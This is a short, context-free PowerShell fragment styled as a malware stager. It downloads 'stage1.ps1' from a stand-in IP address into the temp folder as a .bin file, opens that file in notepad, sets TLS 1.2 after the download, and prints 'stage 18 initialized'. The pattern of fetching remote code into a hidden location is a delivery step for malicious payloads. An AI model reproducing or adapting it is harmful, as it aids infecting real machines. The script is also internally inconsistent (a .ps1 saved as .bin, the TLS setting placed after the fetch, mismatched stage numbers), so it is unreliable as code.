Start-BitsTransfer -Source "http://192.0.2.5/stage1.ps1" -Destination "$env:TEMP\stage1.bin"
Start-Process -FilePath "notepad.exe" -ArgumentList "$env:TEMP\stage1.bin"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Write-Output "stage 18 initialized"
